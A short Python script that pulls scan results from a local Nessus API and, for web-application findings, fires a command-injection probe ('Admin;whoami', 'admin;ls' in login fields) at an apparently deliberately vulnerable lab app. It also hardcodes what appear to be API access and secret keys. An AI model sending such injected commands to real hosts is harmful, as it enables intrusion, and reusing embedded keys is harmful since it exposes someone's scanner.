import requests
header={'X-ApiKeys': 'accessKey=12300ab3bc4504d10c3ac3bb1b5f84ef7c49f6cf6b0a059fcf05099be8d1ee62; secretKey=b799df02cc38e8baa622b4ab9e659703eaf286c06426628a266cffb320393275;'}
url="https://127.0.0.1:8834/scans"
sonuc=requests.get(url=url,headers=header,verify=False)
for i in sonuc.json()['scans']:
	#print i['name'],"-",i['uuid'],"-",i['id']
	url2="https://127.0.0.1:8834/scans/"+str(i['id'])
	sonuc2=requests.get(url=url2,headers=header,verify=False)
	try:
		for j in sonuc2.json()['vulnerabilities']:
			if "Web" in j['plugin_family']:
				print "Web uygulamasidir"
				hedef=sonuc2.json()['info']['targets']
				print hedef
				url="http://"+str(hedef)+"/Vulnerable-Web-Application/CommandExecution/CommandExec-1.php?username=Admin%3Bwhoami&password=admin%3Bls"
				sayfa=requests.get(url)
				print sayfa.content
				if "www-data" in sayfa.content:
					print "Command injection var"
	except:
		pass
